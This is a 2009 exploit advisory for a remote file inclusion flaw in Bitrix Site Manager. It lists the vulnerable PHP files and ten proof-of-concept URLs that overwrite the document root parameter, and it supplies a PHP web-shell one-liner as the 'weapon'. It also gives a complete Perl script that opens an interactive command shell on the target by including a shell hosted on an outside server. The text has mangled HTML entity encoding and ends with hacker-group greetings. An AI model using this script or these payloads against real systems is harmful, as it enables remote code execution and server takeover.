#####
# [+] Author	: Don Tukulesto (root@indonesiancoder.com)
# [+] Date 	: November 13, 2009
# [+] Homepage	: http://www.indonesiancoder.com
# [+] Vendor 	: http://www.bitrixsoft.com/
# [+] Method	: Remote File Inclusion
# [+] Location 	: INDONESIA
# [~] Notes	: I know this is an old bugs, but i just write this exploit under perl module.
# [~] Refrence	: http://www.securityfocus.com/bid/13965
# [~] How To	:
# perl tux.pl &amp;lt;target&amp;gt; &amp;lt;weapon url&amp;gt; cmd
# perl tux.pl http://127.0.0.1/path/ http://www.indonesiancoder.org/shell.txt cmd
# Weapon example: &amp;lt;?php system($_GET[&amp;#039;cmd&amp;#039;]); ?&amp;gt;
#####
&amp;lt;!--more--&amp;gt;
# [-] Bugs in

[+] rss.php
&amp;lt;pre lang=&amp;quot;php&amp;quot;&amp;gt;
&amp;lt;?
require($_SERVER[&amp;quot;DOCUMENT_ROOT&amp;quot;].&amp;quot;/bitrix/modules/iblock/rss.php&amp;quot;);
?&amp;gt; 
&amp;lt;/pre&amp;gt;

[+] redirect.php
&amp;lt;pre lang=&amp;quot;php&amp;quot;&amp;gt;
&amp;lt;?
define(&amp;quot;GENERATE_EVENT&amp;quot;,&amp;quot;Y&amp;quot;);
require_once($_SERVER[&amp;quot;DOCUMENT_ROOT&amp;quot;].&amp;quot;/bitrix/modules/main/include/prolog_before.php&amp;quot;);
if (CModule::IncludeModule(&amp;quot;statistic&amp;quot;))
{
    $goto = eregi_replace(&amp;quot;#EVENT_GID#&amp;quot;,CStatEvent::GetGID(),$goto);
}
else
{
    $goto = eregi_replace(&amp;quot;#EVENT_GID#&amp;quot;,&amp;quot;&amp;quot;,$goto);
}
LocalRedirect($goto);
?&amp;gt; 
&amp;lt;/pre&amp;gt;

[+] click.php
&amp;lt;pre lang=&amp;quot;php&amp;quot;&amp;gt;
&amp;lt;?
define(&amp;quot;GENERATE_EVENT&amp;quot;,&amp;quot;Y&amp;quot;);
require_once($_SERVER[&amp;quot;DOCUMENT_ROOT&amp;quot;].&amp;quot;/bitrix/modules/main/include/prolog_before.php&amp;quot;);
if (intval($id)&amp;gt;0 and CModule::IncludeModule(&amp;quot;advertising&amp;quot;)) CAdvBanner::Click($id);
if (CModule::IncludeModule(&amp;quot;statistic&amp;quot;)) $goto = str_replace(&amp;quot;#EVENT_GID#&amp;quot;,CStatEvent::GetGID(),$goto);
LocalRedirect($goto);
?&amp;gt;
&amp;lt;/pre&amp;gt;

[+] admin/index.php
&amp;lt;pre lang=&amp;quot;php&amp;quot;&amp;gt;
&amp;lt;?
require_once(dirname(__FILE__).&amp;quot;/../modules/main/include/prolog_admin_before.php&amp;quot;);
include($_SERVER[&amp;quot;DOCUMENT_ROOT&amp;quot;].BX_ROOT.&amp;quot;/modules/main/include/prolog_admin_after.php&amp;quot;);
?&amp;gt;
&amp;lt;?
include($_SERVER[&amp;quot;DOCUMENT_ROOT&amp;quot;].BX_ROOT.&amp;quot;/modules/main/interface/index.php&amp;quot;);
include($_SERVER[&amp;quot;DOCUMENT_ROOT&amp;quot;].BX_ROOT.&amp;quot;/modules/main/include/epilog_admin.php&amp;quot;);
?&amp;gt;
&amp;lt;/pre&amp;gt;

[+] tools/help.php
&amp;lt;pre lang=&amp;quot;php&amp;quot;&amp;gt;
&amp;lt;?require($_SERVER[&amp;quot;DOCUMENT_ROOT&amp;quot;].&amp;quot;/bitrix/modules/main/tools/help.php&amp;quot;);?&amp;gt; 
&amp;lt;/pre&amp;gt;

[+] tools/calendar.php
&amp;lt;pre lang=&amp;quot;php&amp;quot;&amp;gt;
&amp;lt;?require($_SERVER[&amp;quot;DOCUMENT_ROOT&amp;quot;].&amp;quot;/bitrix/modules/main/tools/calendar.php&amp;quot;);?&amp;gt; 
&amp;lt;/pre&amp;gt;

[+] tools/ticket_show_file.php
&amp;lt;pre lang=&amp;quot;php&amp;quot;&amp;gt;
&amp;lt;?require($_SERVER[&amp;quot;DOCUMENT_ROOT&amp;quot;].&amp;quot;/bitrix/modules/support/admin/ticket_show_file.php&amp;quot;);?&amp;gt; 
&amp;lt;/pre&amp;gt;

[+] tools/imagepg.php
&amp;lt;pre lang=&amp;quot;php&amp;quot;&amp;gt;
&amp;lt;?require($_SERVER[&amp;quot;DOCUMENT_ROOT&amp;quot;].&amp;quot;/bitrix/modules/main/tools/imagepg.php&amp;quot;);?&amp;gt; 
&amp;lt;/pre&amp;gt;

[+] tools/help_view.php
&amp;lt;pre lang=&amp;quot;php&amp;quot;&amp;gt;
&amp;lt;?require($_SERVER[&amp;quot;DOCUMENT_ROOT&amp;quot;].&amp;quot;/bitrix/modules/main/tools/help_view.php&amp;quot;);?&amp;gt; 
&amp;lt;/pre&amp;gt;

[+] tools/help_create.php
&amp;lt;pre lang=&amp;quot;php&amp;quot;&amp;gt;
&amp;lt;?require($_SERVER[&amp;quot;DOCUMENT_ROOT&amp;quot;].&amp;quot;/bitrix/modules/main/tools/help_create.php&amp;quot;);?&amp;gt; 
&amp;lt;/pre&amp;gt;

[-] PoC

http://127.0.0.1/BX_ROOT/rss.php?_SERVER[DOCUMENT_ROOT]=
http://127.0.0.1/BX_ROOT/click.php?_SERVER[DOCUMENT_ROOT]=
http://127.0.0.1/BX_ROOT/redirect.php?_SERVER[DOCUMENT_ROOT]=
http://127.0.0.1/BX_ROOT/admin/index.php?_SERVER[DOCUMENT_ROOT]=
http://127.0.0.1/BX_ROOT/tools/help_create.php?_SERVER[DOCUMENT_ROOT]=
http://127.0.0.1/BX_ROOT/tools/help_view.php?_SERVER[DOCUMENT_ROOT]=
http://127.0.0.1/BX_ROOT/tools/imagepg.php?_SERVER[DOCUMENT_ROOT]=
http://127.0.0.1/BX_ROOT/tools/ticket_show_file.php?_SERVER[DOCUMENT_ROOT]=
http://127.0.0.1/BX_ROOT/tools/calendar.php?_SERVER[DOCUMENT_ROOT]=
http://127.0.0.1/BX_ROOT/tools/help.php?_SERVER[DOCUMENT_ROOT]=

[-] eXpL0!t c0des

&amp;lt;pre lang=&amp;quot;perl&amp;quot;&amp;gt;
#!/usr/bin/perl

use HTTP::Request;
use LWP::UserAgent;
$RoNz = $ARGV[0];
$Pathloader = $ARGV[1];
$Contrex = $ARGV[2];
if($RoNz!~/http:\/\// || $Pathloader!~/http:\/\// || !$Contrex){usage()}
head();
sub head()
 {
 print &amp;quot;[o]============================================================================[o]\r\n&amp;quot;;
 print &amp;quot; |	  Bitrix Site Manager Multiple Remote File Include Vulnerability	|\r\n&amp;quot;;
 print &amp;quot;[o]============================================================================[o]\r\n&amp;quot;;
 }
while()
{
      print &amp;quot;[w00t] \$&amp;quot;;
while(&amp;lt;STDIN&amp;gt;)
      {
              $kaMtiEz=$_;
              chomp($kaMtiEz);
$arianom = LWP::UserAgent-&amp;gt;new() or die;
$tiw0L = HTTP::Request-&amp;gt;new(GET =&amp;gt;$RoNz.&amp;#039;admin/index.php?_SERVER[DOCUMENT_ROOT]=&amp;#039;.$Pathloader.&amp;#039;?&amp;amp;&amp;#039;.$Contrex.&amp;#039;=&amp;#039;.$kaMtiEz)or die &amp;quot;\nCould Not connect\n&amp;quot;;
$abah_benu = $arianom-&amp;gt;request($tiw0L);
$tukulesto = $abah_benu-&amp;gt;content;
$tukulesto =~ tr/[\n]/[�]/;
if (!$kaMtiEz) {print &amp;quot;\nPlease Enter a Command\n\n&amp;quot;; $tukulesto =&amp;quot;&amp;quot;;}
elsif ($tukulesto =~/failed to open stream: HTTP request denied!/ || $tukulesto =~/: Cannot execute a blank command in /)
      {print &amp;quot;\nCann&amp;#039;t Connect to cmd Host or Invalid Command\n&amp;quot;;exit}
elsif ($tukulesto =~/^&amp;lt;br.\/&amp;gt;.&amp;lt;b&amp;gt;Fatal.error/) {print &amp;quot;\nInvalid Command or No Return\n\n&amp;quot;}
if($tukulesto =~ /(.*)/)
{
      $finreturn = $1;
      $finreturn=~ tr/[�]/[\n]/;
      print &amp;quot;\r\n$finreturn\n\r&amp;quot;;
      last;
}
else {print &amp;quot;[w00t] \$&amp;quot;;}}}last;
sub usage()
 {
 head();
 print &amp;quot; | Usage:  perl tux.pl &amp;lt;target&amp;gt; &amp;lt;weapon url&amp;gt; &amp;lt;cmd&amp;gt;				|\r\n&amp;quot;;
 print &amp;quot; | &amp;lt;Site&amp;gt; - Full path to execute ex: http://127.0.0.1/path/			|\r\n&amp;quot;;
 print &amp;quot; | &amp;lt;Weapon url&amp;gt; - Path to Shell e.g http://www.indonesiancoder.org/shell.txt	|\r\n&amp;quot;;
 print &amp;quot; | &amp;lt;cmd&amp;gt; - Command variable used in php shell					|\r\n&amp;quot;;
 print &amp;quot;[o]============================================================================[o]\r\n&amp;quot;;
 print &amp;quot; | 	IndonesianCoder Team | KILL-9 CREW | ServerIsDown | AntiSecurity.org    |\r\n&amp;quot;;
 print &amp;quot; |   kaMtiEz, M3NW5, arianom, tiw0L, Pathloader, abah_benu, VycOd, Gh4mb4S      |\r\n&amp;quot;;
 print &amp;quot; | M364TR0N, TUCKER, Ian Petrucii, kecemplungkalen, NoGe, bh4nd55, MainHack.Net |\r\n&amp;quot;;
 print &amp;quot; |  Jack-, Contrex, yadoy666, Ronz, noname, s4va, gonzhack, cyb3r_tron, saint   |\r\n&amp;quot;;
 print &amp;quot; |    Awan Bejat, Plaque, rey_cute, BennyCooL, SurabayaHackerLink Team and YOU! |\r\n&amp;quot;;
 print &amp;quot;[o]============================================================================[o]\r\n&amp;quot;;
 print &amp;quot; |	http://www.IndonesianCoder.org	   |	http://www.AntiSecRadio.fm 	|\r\n&amp;quot;;
 print &amp;quot;[o]============================================================================[o]\r\n&amp;quot;;
 exit();
 }
&amp;lt;/pre&amp;gt;
